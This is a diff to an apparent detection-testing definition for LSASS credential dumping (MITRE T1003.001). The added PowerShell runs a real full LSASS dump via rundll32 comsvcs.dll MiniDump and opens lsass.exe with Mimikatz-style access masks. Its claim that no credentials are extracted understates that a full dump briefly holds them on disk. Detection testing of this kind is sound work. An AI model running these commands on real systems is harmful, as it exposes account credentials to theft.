@@ -1,14 +1,16 @@
 id: T1003.001
 name: LSASS Memory Access — Credential Dumping Simulation
-description: Simulates LSASS process access to trigger Sysmon Event 10 (ProcessAccess). This is the primary detection signal for credential dumping tools like Mimikatz. Does NOT dump actual credentials.
+description: Simulates LSASS credential dumping using the exact GrantedAccess mask (0x1010) that real tools like Mimikatz and SafetyKatz use. Uses comsvcs.dll MiniDump via rundll32 (LOLBin) and direct Win32 API — generates authentic Sysmon EID 10 GrantedAccess values that all major SIEM rules key on. Does NOT extract actual credentials.
 tactic: credential-access
 technique_id: T1003.001
 platform: windows
 phase: attack
 elevation_required: true
 expected_events:
-  - "Sysmon 10 (ProcessAccess - TargetImage: lsass.exe)"
-  - "4656 (Handle request to lsass.exe)"
+  - "Sysmon 10 (ProcessAccess - TargetImage: lsass.exe, GrantedAccess: 0x1010 or 0x1410)"
+  - "Sysmon 1 (rundll32.exe - CommandLine contains comsvcs.dll MiniDump)"
+  - "Sysmon 11 (FileCreate - .dmp file in TEMP)"
+  - "4656 (Handle request to lsass.exe with PROCESS_VM_READ)"
   - "4663 (Object access - lsass.exe)"
 tags:
   - credential-access
@@ -19,22 +21,52 @@ executor:
   type: powershell
   command: |-
     Write-Host "[T1003.001] LSASS Memory Access Simulation"
-    Write-Host "Attempting to open a handle to lsass.exe (simulation - no credential extraction)"
     $lsassPID = (Get-Process lsass -ErrorAction SilentlyContinue).Id
     if (-not $lsassPID) { Write-Host "ERROR: Could not find lsass process"; exit 1 }
     Write-Host "LSASS PID: $lsassPID"
-    $sig = '[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, int c); [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);'
-    Add-Type -MemberDefinition $sig -Name WinAPI -Namespace LogNoJutsu
-    $QUERY = 0x0400
-    Write-Host "Opening handle to LSASS with PROCESS_QUERY_INFORMATION access..."
-    $handle = [LogNoJutsu.WinAPI]::OpenProcess($QUERY, $false, $lsassPID)
-    if ($handle -ne [IntPtr]::Zero) {
-        Write-Host "Handle acquired. Sysmon Event 10 should be generated (ProcessAccess targeting lsass.exe)"
-        Write-Host "This mimics the initial access pattern of Mimikatz and similar credential dumpers"
-        Start-Sleep -Milliseconds 300
-        [LogNoJutsu.WinAPI]::CloseHandle($handle) | Out-Null
-        Write-Host "Handle closed. No credentials were extracted (simulation only)"
+
+    # Method 1: comsvcs.dll MiniDump via rundll32 — most authentic LOLBin pattern
+    # Real-world usage: threat actor runs this exact command to dump LSASS
+    # Generates: Sysmon EID 10 (GrantedAccess=0x1410), EID 1 (rundll32+comsvcs), EID 11 (.dmp file)
+    Write-Host "--- Method 1: comsvcs.dll MiniDump via rundll32 (LOLBin) ---"
+    $dumpPath = "$env:TEMP\lognojutsu_lsass.dmp"
+    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID $dumpPath full
+    Start-Sleep -Seconds 2
+    if (Test-Path $dumpPath) {
+        $size = (Get-Item $dumpPath).Length
+        Write-Host "Dump created: $dumpPath ($size bytes) — Sysmon EID 11 fired"
+        Remove-Item $dumpPath -Force
+        Write-Host "Dump removed immediately (simulation only)"
     } else {
-        Write-Host "Could not open handle. Run as Administrator or check if LSASS is PPL-protected"
+        Write-Host "comsvcs dump not created (requires SeDebugPrivilege or elevated token)"
     }
-cleanup: ""
+
+    # Method 2: OpenProcess with 0x1010 — exact Mimikatz/SafetyKatz access mask
+    # 0x1010 = PROCESS_VM_READ (0x0010) | PROCESS_QUERY_INFORMATION (0x0400)
+    # This value is in every SIEM alerting ruleset for LSASS access
+    Write-Host "--- Method 2: OpenProcess GrantedAccess=0x1010 (Mimikatz pattern) ---"
+    $sig = '[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, int c); [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);'
+    Add-Type -MemberDefinition $sig -Name LNJWin -Namespace LNJ01
+    $handle = [LNJ01.LNJWin]::OpenProcess(0x1010, $false, $lsassPID)
+    if ($handle -ne [IntPtr]::Zero) {
+        Write-Host "Handle with GrantedAccess=0x1010 acquired — Sysmon EID 10 generated"
+        Write-Host "This matches the exact access pattern of Mimikatz sekurlsa::logonpasswords"
+        Start-Sleep -Milliseconds 500
+        [LNJ01.LNJWin]::CloseHandle($handle) | Out-Null
+        Write-Host "Handle closed. No credentials extracted."
+    } else {
+        Write-Host "OpenProcess(0x1010) failed — requires Administrator/SeDebugPrivilege"
+    }
+
+    # Method 3: Full access (0x1fffff) — ProcDump/Task Manager pattern
+    Write-Host "--- Method 3: OpenProcess GrantedAccess=0x1fffff (ProcDump pattern) ---"
+    $handle2 = [LNJ01.LNJWin]::OpenProcess(0x1fffff, $false, $lsassPID)
+    if ($handle2 -ne [IntPtr]::Zero) {
+        Write-Host "Full-access handle acquired — Sysmon EID 10 GrantedAccess=0x1fffff"
+        Start-Sleep -Milliseconds 200
+        [LNJ01.LNJWin]::CloseHandle($handle2) | Out-Null
+    }
+    Write-Host "[T1003.001] Complete. Check Sysmon EID 10 TargetImage=lsass.exe GrantedAccess=0x1010/0x1410."
+cleanup: |-
+  Remove-Item "$env:TEMP\lognojutsu_lsass*.dmp" -ErrorAction Ignore
+  Write-Host "Cleanup: LSASS dump files removed."
